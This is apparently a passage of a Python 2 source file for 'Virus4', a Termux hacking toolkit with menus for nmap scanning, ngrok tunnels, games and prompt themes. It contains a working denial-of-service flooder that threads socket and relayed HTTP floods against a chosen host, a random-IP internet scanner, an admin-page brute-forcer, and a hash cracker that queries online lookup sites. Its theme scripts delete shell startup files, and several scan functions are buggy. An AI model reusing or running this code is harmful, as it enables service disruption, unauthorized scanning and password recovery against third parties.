      virus_linux()
 elif nember == '5' or nember == '05' :
      virus_whatsapp()
 elif nember == '6' or nember == '06' :
      upload_vp()
 elif nember == '0' or nember == '00' :
      Virus4()
 else :
      error()
      virus()
 
def ngrok_tcp():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 port = raw_input(cyan +'  [port]----> ')  
 if port == "0" or port == "00":
   Ngrok()
 else :
  os.system('~/./ngrok tcp ' +port)
  os.system('~/ngrok tcp ' +port)
  backtomenu_ngrok()
def ngrok_http():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 port = raw_input(cyan +'  [port]----> ')  
 if port == "0" or port == "00":
   Ngrok()
 else :
  os.system('~/./ngrok http ' +port)
  os.system('~/ngrok http ' +port) 
  backtomenu_ngrok()
def ngrok_download():
 print cyan +'\n###### ngrok'
 os.system('git clone https://github.com/Amerlaceset/Ngrok')
 os.system('cp -r Ngrok/ngrok ~')
 os.system('rm -rf Ngrok')
 print 'Done'
 backtomenu_ngrok()
def Ngrok():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]open ngrok http'
 time.sleep(0.05)
 print cyan +'        [02]open ngrok tcp'
 time.sleep(0.05)
 print cyan +'        [03]Download ngrok'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "ngrok"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      ngrok_http()
 elif nember == '2' or nember == '02' :
      ngrok_tcp()
 elif nember == '3' or nember == '03' :
      ngrok_download()
 elif nember == '0' or nember == '00' :
      Virus4()
 else :
      error()
      Ngrok()
 
def nmap_check():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [ip]----> ')  
 if port == "0" or port == "00":
   nmap_wihoot_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('nmap ' +ip)  
 backtomenu_nmap()

def nmap_all():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [enter]----> ')  
 if port == "0" or port == "00":
   nmap_wihoot_root()
 else :
  print blue +' [*]scan all ip'
  print ''
  os.system('nmap -sn 192.168.1.1/24')  
 backtomenu_nmap()
def nmap_random():
 r = '\x1b[1;31m'
 g = '\x1b[1;32m'
 yy = '\x1b[1;33m'
 bb = '\x1b[1;34m'
 cc = '\x1b[1;36m'
 import random, os
 print cyan, '       #########'
 print red,  '        amer.dz '
 print cyan, '       #########'
 print cyan, '       ||     || '
 print cyan, '       ||     ||'
 print cyan, '       ||     ||'
 print cyan, '       \\/     \\/'

 def hi():
    a = str(random.randint(50, 250))
    b = str(random.randint(50, 250))
    c = str(random.randint(50, 250))
    d = str(random.randint(50, 250))
    go = a + '.' + b + '.' + c + '.' + d
    x = os.system('nmap ' + go + '> nn.txt')
    zzz = 'nn.txt'
    u = open(zzz, 'r')
    uu = u.read()
    print r
    if '445/' and '80/' and 'open' in uu:
        print g, '++++++++(goob==>port)+++++++'
        print g, '====(', bb, go, g, ')===='
        print cc
        print uu
        print yy
        kk = raw_input('Press Enter----(s=save)--->  ')
        if 's' in kk:
            print ' save---------> ' + g + d + '.txt'
            os.system('cd')
            os.system('nmap ' + go + '>' + d + '.txt')
        else:
            print ' '
    else:
        print r, 'no======>', go
    hi()


 hi()
 backtomenu_nmap()
def nmap_udp1():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [ip]----> ')  
 if port == "0" or port == "00":
   nmap_wihoot_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('nmap -sU ' +ip)  
 backtomenu_nmap()
def nmap_ver():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [ip]----> ')  
 if port == "0" or port == "00":
   nmap_wihoot_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('nmap -sV ' +ip)  
 backtomenu_nmap

def nmap_tcp():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [ip]----> ')  
 if port == "0" or port == "00":
   nmap_wihoot_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('nmap -sT -p ' +ip)  
 backtomenu_nmap
 
def nmap_wihoot_root():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Check the ip'
 time.sleep(0.05)
 print cyan +'        [02]All Devices'
 time.sleep(0.05)
 print cyan +'        [03]Guess on ip'
 time.sleep(0.05)
 print cyan +'        [04]For UDP ports'
 time.sleep(0.05)
 print cyan +'        [05]Versions ports'
 time.sleep(0.05)
 print cyan +'        [06]For TCP ports'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "nmap/nmap_wihout_root"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      nmap_check()
 elif nember == '2' or nember == '02' :
      nmap_all()
 elif nember == '3' or nember == '03' :
      nmap_random()
 elif nember == '4' or nember == '04' :
      nmap_udp1()
 elif nember == '5' or nember == '05' :
      nmap_ver()
 elif nember == '6' or nember == '06' :
      nmap_tcp()
 elif nember == '0' or nember == '00' :
      Nmap()
 else :
      error()
      nmap_wihoot_root()

def nmap_syn():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [url/ip]----> ')  
 if port == "0" or port == "00":
   nmap_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('sudo nmap -sS ' +ip)  
 backtomenu_nmap()
 
def nmap_nwaa():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [url/ip]----> ')  
 if port == "0" or port == "00":
   nmap_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('sudo nmap -O ' +ip)  
 backtomenu_nmap()

def nmap_fire():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [url/ip]----> ') 
 port = raw_input(cyan +'  [port]----> ') 
 if port == "0" or port == "00":
   nmap_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('sudo nmap -sA -p ' +port+ ' '+ip)  
 backtomenu_nmap()


def nmap_udp2():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [url/ip]----> ')  
 if port == "0" or port == "00":
   nmap_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('sudo nmap -Pn -sS -sU -T4 -v ' +ip)  
 backtomenu_nmap()
 
def nmap_plus():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [url/ip]----> ')  
 if port == "0" or port == "00":
   nmap_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('sudo nmap -Pn -sV -T4 -O -F --version-all ' +ip)  
 backtomenu_nmap()

def nmap_traceroute():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 ip = raw_input(cyan +'  [url/ip]----> ')  
 if port == "0" or port == "00":
   nmap_root()
 else :
  print blue + '[*]scan ip'
  time.sleep(2)
  print ''
  os.system('sudo nmap -Pn -sn --traceroute ' +ip)  
 backtomenu_nmap()
def nmap_with_root():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]send packit SYN'
 time.sleep(0.05)
 print cyan +'        [02]Device type'
 time.sleep(0.05)
 print cyan +'        [03]Firewall strength'
 time.sleep(0.05)
 print cyan +'        [04]For UDP ports'
 time.sleep(0.05)
 print cyan +'        [05]QUICK SCAN PLUS'
 time.sleep(0.05)
 print cyan +'        [06]QUICK traceroute'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "nmap/nmap_with_root"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      nmap_syn()
 elif nember == '2' or nember == '02' :
      nmap_nwaa()
 elif nember == '3' or nember == '03' :
      nmap_fire()
 elif nember == '4' or nember == '04' :
      nmap_udp2()
 elif nember == '5' or nember == '05' :
      nmap_plus()
 elif nember == '6' or nember == '06' :
      nmap_traceroute()
 elif nember == '0' or nember == '00' :
      Nmap()
 else :
      error()
      nmap_with_root()
def Nmap():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]nmap wihout root'
 time.sleep(0.05)
 print cyan +'        [02]nmap with root'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "nmap"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      nmap_wihoot_root()
 elif nember == '2' or nember == '02' :
      nmap_with_root()
 elif nember == '0' or nember == '00' :
      Virus4()
 else :
      error()
      Nmap()
      
def games_snake():
 import curses
 from curses import KEY_RIGHT, KEY_LEFT, KEY_UP, KEY_DOWN
 from random import randint


 curses.initscr()
 win = curses.newwin(20, 60, 0, 0)
 win.keypad(1)
 curses.noecho()
 curses.curs_set(0)
 win.border(0)
 win.nodelay(1)

 key = KEY_RIGHT                                                    # Initializing values
 score = 0

 snake = [[4,10], [4,9], [4,8]]                                     # Initial snake co-ordinates
 food = [10,20]                                                     # First food co-ordinates

 win.addch(food[0], food[1], '*')                                   # Prints the food

 while key != 27:                                                   # While Esc key is not pressed
    win.border(0)
    win.addstr(0, 2, 'Score : ' + str(score) + ' ')                # Printing 'Score' and
    win.addstr(0, 27, ' SNAKE ')                                   # 'SNAKE' strings
    win.timeout(150 - (len(snake)/5 + len(snake)/10)%120)          # Increases the speed of Snake as its length increases

    prevKey = key                                                  # Previous key pressed
    event = win.getch()
    key = key if event == -1 else event 


    if key == ord(' '):                                            # If SPACE BAR is pressed, wait for another
        key = -1                                                   # one (Pause/Resume)
        while key != ord(' '):
            key = win.getch()
        key = prevKey
        continue

    if key not in [KEY_LEFT, KEY_RIGHT, KEY_UP, KEY_DOWN, 27]:     # If an invalid key is pressed
        key = prevKey

    # Calculates the new coordinates of the head of the snake. NOTE: len(snake) increases.
    # This is taken care of later at [1].
    snake.insert(0, [snake[0][0] + (key == KEY_DOWN and 1) + (key == KEY_UP and -1), snake[0][1] + (key == KEY_LEFT and -1) + (key == KEY_RIGHT and 1)])

    # If snake crosses the boundaries, make it enter from the other side
    if snake[0][0] == 0: snake[0][0] = 18
    if snake[0][1] == 0: snake[0][1] = 58
    if snake[0][0] == 19: snake[0][0] = 1
    if snake[0][1] == 59: snake[0][1] = 1

    # Exit if snake crosses the boundaries (Uncomment to enable)
    #if snake[0][0] == 0 or snake[0][0] == 19 or snake[0][1] == 0 or snake[0][1] == 59: break

    # If snake runs over itself
    if snake[0] in snake[1:]: break


    if snake[0] == food:                                            # When snake eats the food
        food = []
        score += 1
        while food == []:
            food = [randint(1, 18), randint(1, 58)]                 # Calculating next food's coordinates
            if food in snake: food = []
        win.addch(food[0], food[1], '*')
    else:    
        last = snake.pop()                                          # [1] If it does not eat the food, length decreases
        win.addch(last[0], last[1], ' ')
    win.addch(snake[0][0], snake[0][1], '#')

 curses.endwin()
 print("\nScore - " + str(score))
 backtomenu_games()
def games_moon():
 os.system('apt-get install moon-buggy')
 os.system('pkg install moon-buggy')
 os.system('moon-buggy')
 backtomenu_games()
def games_greed():
 os.system('apt-get install greed')
 os.system('pkg install greed')
 os.system('greed')
 backtomenu_games()
def games():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]games snake'
 time.sleep(0.05)
 print cyan +'        [02]games moon-buggy'
 time.sleep(0.05)
 print cyan +'        [03]games greed'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "games"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      games_snake()
 elif nember == '2' or nember == '02' :
      games_moon()
 elif nember == '3' or nember == '03' :
      games_greed()
 elif nember == '0' or nember == '00' :
      Virus4()
 else :
      error()
      games()
def termux_1():
 print ''
 time.sleep(2)
 os.system('rm -rf sem.sh')
 f = open('sem.sh' , 'w')
 f.write('''
read -p "            name-------> " amer
rm $HOME/.bashrc
rm ~/../usr/etc/bash.bashrc
sed "s/Sniper/$amer/" tools/Termux/termux_1 > ~/.bashrc
pkg install figlet

''')
 f.close()
 os.system('bash sem.sh')
 os.system('rm -rf sem.sh')
 backtomenu_termux()
def termux_2():
 print ''
 time.sleep(2)
 os.system('rm -rf sem.sh')
 f = open('sem.sh' , 'w')
 f.write('''
read -p "            name-------> " amer
rm $HOME/.bashrc
rm ~/../usr/etc/bash.bashrc
sed "s/max/$amer/" tools/Termux/termux_2 > ~/.bashrc
pkg install figlet

''')
 f.close()
 os.system('bash sem.sh')
 os.system('rm -rf sem.sh')
 backtomenu_termux()
def termux_3():
 print ''
 time.sleep(2)
 os.system('rm -rf sem.sh')
 f = open('sem.sh' , 'w')
 f.write('''
rm $HOME/.bashrc
rm ~/../usr/etc/bash.bashrc
sed "s/YourSelF/$amer/" tools/Termux/termux_3 > ~/.bashrc
pkg install figlet
''')
 f.close()
 os.system('bash sem.sh')
 os.system('rm -rf sem.sh')
 backtomenu_termux()
def termux():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Change the shape of Termux'
 time.sleep(0.05)
 print cyan +'        [02]Change shape of the skull Termux'
 time.sleep(0.05)
 print cyan +'        [03]Change shape of the skull(2) Termux'
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "termux"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      termux_1()
 elif nember == '2' or nember == '02' :
      termux_2()
 elif nember == '3' or nember == '03' :
      termux_3()
 elif nember == '0' or nember == '00' :
      Virus4()
 else :
      error()
      termux()
def ddos():
 
 from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib,random
 def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


 def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


 def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print "\033[94mbot is max...\033[0m"
			time.sleep(.1)
	except:
		time.sleep(.1)


 def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print "\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Max is attacking--> \033[0m"
			else:
				s.shutdown(1)
				print "\033[91mshut<->down\033[0m"
			time.sleep(.1)
	except socket.error as e:
		print "\033[91mno connection! server maybe down\033[0m"
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


 def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


 def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


 def usage():
	print('')


 def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')

	host = raw_input(green+'ip/link+----------> ') 
	port = raw_input(green+'port/80+----------> ')
	thr = raw_input(green+'Time in seconds+--> ')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
 global data
 headers = open("headers.txt", "r")
 data = headers.read()
 headers.close()
#task queue are q,w
 q = Queue()
 w = Queue()


 if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print "\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m"
	print "\033[94mPlease wait...\033[0m"
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print "\033[91mcheck server ip and port\033[0m"
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
 backtomenu_website()
def admin():
 from urllib2 import Request, urlopen, URLError, HTTPError

 def Space(j):
	i = 0
	while i<=j:
		print " ",
		i+=1


 def findAdmin():
	f = open("link.txt","r");
	link = raw_input("Enter Site Name \n(ex : example.com or www.example.com ): ")
	print "\n\nAvilable links : \n"
	while True:
		sub_link = f.readline()
		if not sub_link:
			break
		req_link = "http://"+link+"/"+sub_link
		req = Request(req_link)
		try:
			response = urlopen(req)
		except HTTPError as e:
			continue
		except URLError as e:
			continue
		else:
			print "OK => ",req_link

 def Credit():
	Space(9); print "#####################################"
	Space(9); print "#   +++ welcome to my tools +++   #"
	Space(9); print "#       I LOVE YOU MY FRINDES       #"
	Space(9); print "#    My Name is Amer DZ {Virus4}    #"
	Space(9); print "#####################################"

 Credit()
 findAdmin()
 backtomenu_website()
def hash_id():
 #! usr/bin/python2

 """
__Author__ = Ci Ku ~ debby anggraini a.k.a xnver404
__Name__ = Virus4
__version__ = 5.0.0
__Code__ = python
__Github__ = https://github.com/amerlaceser
__Date__ = 26 - 8 - 2019

"""

 import sys ,  hashlib ,  time ,  os , random , binascii

 from urllib import urlopen, urlencode
 from re import search

# color
 if sys.platform == "linux" or sys.platform == "linux2":

	BB = "\033[34;1m" # Blue light
	YY = "\033[33;1m" # Yellow light
	GG = "\033[32;1m" # Green light
	WW = "\033[0;1m"  # White light
	RR = "\033[31;1m" # Red light
	CC = "\033[36;1m" # Cyan light
	B = "\033[34m"    # Blue
	Y = "\033[33m"    # Yellow
	G = "\033[32m"    # Green
	W = "\033[0m"     # White
	R = "\033[31m"    # Red
	C = "\033[36m"    # Cyan

	# Random color
	rand = (BB,YY,GG,WW,RR,CC)
	P = random.choice(rand)

 elif sys.platform == "win32":

	BB = '' # Blue light
	YY = '' # Yellow light
	GG = '' # Green light
	WW = '' # White light
	RR = '' # Red light
	CC = '' # Cyan light
	B = ''  # Blue
	Y = ''  # Yellow
	G = ''  # Green
	W = ''  # White
	R = ''  # Red
	C = ''  # Cyan
	P = ''  # Random color

 def banner():
	print ""

 def info():

	print ""
 def Update():
	if sys.platform == "linux" or sys.platform == "linux2":
		print (B+" 0={"+W+" UPDATE WORDLIST "+B+"}=0\n")
		time.sleep(1)

		print (B+"["+W+"="+B+"] "+G+"remove old wordlist")
		os.system("sleep 2")
		time.sleep(1)

		print (B+"["+W+"="+B+"] "+G+"downloading new wordlist")
		time.sleep(1)

		print (R+"["+W+"*"+R+"] "+R+"Curl Started ...\n"+W)

		os.system("sleep 0.5")

		print (R+"\n["+W+"*"+R+"] "+G+"download Finish\n"+W)
		sys.exit()
	else:
		print ("sorry, word list update feature is only available on linux platform\n")
		sys.exit()


 try:

	# module tambahan

	import progressbar
	from passlib.hash import mysql323 as m20
	from passlib.hash import mysql41 as m25
	from passlib.hash import mssql2000 as ms20
	from passlib.hash import mssql2005 as ms25
	from passlib.hash import nthash as nthash
	from passlib.hash import lmhash as lmhash

 except ImportError:
        banner()
	time.sleep(0.5)
        print (B+"["+W+"="+B+"] "+G+"installing module "+R+"progressbar , passlib\n"+W)

	os.system("pip2 install --upgrade pip")
	os.system("pip2 install passlib")
	os.system("pip2 install progressbar")

	print (B+"\n["+W+"="+B+"] "+G+"install success , run program again\n"+W)
        sys.exit()

 def hash():
	banner()

	hash_str = raw_input(B+"["+W+"?"+B+"]"+G+" Hash : "+W)
#	time.sleep(0.5)
	print (B+"["+R+"="+B+"] "+G+"Cek Hash Type ...")
#	time.sleep(1)


	# Contoh Hash nya , nb : jangan di ubah ntar error

	SHA512= ('dd0ada8693250b31d9f44f3ec2d4a106003a6ce67eaa92e384b356d1b4ef6d66a818d47c1f3a2c6e8a9a9b9bdbd28d485e06161ccd0f528c8bbb5541c3fef36f')
	md = ('ae11fd697ec92c7c98de3fac23aba525')
	sha1 = ('4a1d4dbc1e193ec3ab2e9213876ceb8f4db72333')
	sha224 = ('e301f414993d5ec2bd1d780688d37fe41512f8b57f6923d054ef8e59')
	sha384 = ('3b21c44f8d830fa55ee9328a7713c6aad548fe6d7a4a438723a0da67c48c485220081a2fbc3e8c17fd9bd65f8d4b4e6b')
	sha256 = ('2c740d20dab7f14ec30510a11f8fd78b82bc3a711abe8a993acdb323e78e6d5e')
	mysql1323 = ("5d2e19393cc5ef67")
	mysql41 = ("*88166B019A3144C579AC4A7131BCC3AD6FF61DA6")
	mssql2000 = ("0x0100DE9B3306258B37432CAC3A6FB7C638946FA393E09C9CBC0FA8C6E03B803390B1C3E7FB112A21B2304595D490")
	mssql2005 = ('0x01008110620C7BD03A38A28A3D1D032059AE9F2F94F3B74397F8')

	if len(hash_str)==len(mysql1323) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:
		print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"mysql 3.2.3")
		hash = "mysql1323"

	elif len(hash_str)==len(mysql41) and "*" in hash_str:
		print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"mysql 4.1")
		hash = "mysql41"

	elif len(hash_str)==len(mssql2000) and "0x0" in hash_str:
		print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"Mssql2000")
		hash = "mssql2000"

	elif len(hash_str)==len(mssql2005) and "0x0" in hash_str:
		print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"Mssql2005")
                hash = "mssql2005"


	elif len(hash_str)==len(SHA512) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:
	        print (Y+"   ["+W+"01"+Y+"] "+C+"sha512")
		print (Y+"   ["+W+"02"+Y+"] "+C+"whirlpool")
#		time.sleep(0.3)
		cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose hash "+Y+">>> "+W)

		if cek == "1" or cek == "01" or cek == "sha512":
			hash = "sha512"
		elif cek == "2" or cek == "02" or cek == "whirlpool":
			hash = "whirlpool"
		else:
			print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n")
 #                       time.sleep(0.5)
                        sys.exit()

	elif len(hash_str)==len(md) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:

		print (Y+"   ["+W+"01"+Y+"] "+C+"md4")
		print (Y+"   ["+W+"02"+Y+"] "+C+"md5")
		print (Y+"   ["+W+"03"+Y+"] "+C+"Nthash")
		print (Y+"   ["+W+"04"+Y+"] "+C+"Lmhash")
		print (Y+"   ["+W+"05"+Y+"] "+C+"Ntlm hash")

#		time.sleep(0.3)
		cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose Hash "+Y+">>> "+W)

		if cek == "1" or cek == "01" or cek == "md4" or cek == "MD4" or cek == "Md4":
			hash = "md4"
		elif cek == "2" or cek == "02" or cek == "md5" or cek == "MD5" or cek == "Md5":
			try:
				print (B+"["+R+"="+B+"] "+G+"open google")
#				time.sleep(0.3)
				print (B+"["+W+"*"+B+"] "+G+"Start ...")
#				time.sleep(0.3)
				start = ("00:00:00")
				start1 = time.time()
				print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)

				data = urlencode({"md5":hash_str,"x":"21","y":"8"})
        	    		html = urlopen("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", data)
		                find = html.read()
        	     		match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", find)    
	               		if match:

					end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
					print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)
#	                                time.sleep(0.3)
					print (B+"\n["+W+"="+B+"]"+G+" password found ")
					print (B+"["+W+"+"+B+"] "+W+(hash_str)+Y+" 0={==> "+W+(match.group().split('span')[2][3:-6])+"\n")
					sys.exit()
		                else:
					data = urlencode({"md5":hash_str,"x":"21","y":"8"})
            				html = urlopen("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", data)
			                find = html.read()
				        match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", find)
			                if match:

					        end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
        				    	print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)
#						time.sleep(0.3)
						print (B+"\n["+W+"="+B+"]"+G+" password found ")
                				print (B+" ["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('span')[2][3:-6]+W+" \n")
						sys.exit()
			                else:
	                  			url = "http://www.nitrxgen.net/md5db/" + hash_str
        	        			cek = urlopen(url).read()
                				if len(cek) > 0:

						        end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
							print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)
#							time.sleep(0.3)
				                	print (B+"\n["+W+"="+B+"]"+G+" password found ")
						        print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+cek+"\n")
							sys.exit()
						else:

						        end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
							print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(end)
							hash = "md5"

			except IOError:

				end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
				print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)
				hash = "md5"

		elif cek == "03" or cek == "3" or cek.upper() == "NTHASH":
			hash = "nthash"

		elif cek == "04" or cek == "4" or cek.upper() == "LMHASH":
			hash = "lmhash"

		elif cek == "05" or cek == "5" or cek.upper() == "NTLM":
			hash = "ntlm"

		else:
			print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n"+W)
#			time.sleep(0.5)
			sys.exit()


	elif len(hash_str)==len(sha1) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:

		print (Y+"   ["+W+"01"+Y+"] "+C+"sha1")
		print (Y+"   ["+W+"02"+Y+"] "+C+"ripemd160")
#		time.sleep(0.3)
		cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose Hash "+Y+">>> "+W)

		if cek == "1" or cek == "01" or cek == "sha1" or cek == "SHA1" or cek == "Sha1":
#			time.sleep(0.5)
			print (B+"["+R+"="+B+"] "+G+"open google")
#			time.sleep(0.3)
			print (B+"["+W+"*"+B+"] "+G+"Start ...")
#			time.sleep(0.3)
			start = ("00:00:00")
			start1 = time.time()
			print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)
			try:

				data = urlencode({"auth":"8272hgt", "hash":hash_str, "string":"","Submit":"Submit"})
				html = urlopen("http://hashcrack.com/index.php" , data)
				find = html.read()
    				match = search (r'<span class=hervorheb2>[^<]*</span></div></TD>', find)
 				if match:

					end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))
					print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)
#					time.sleep(0.3)
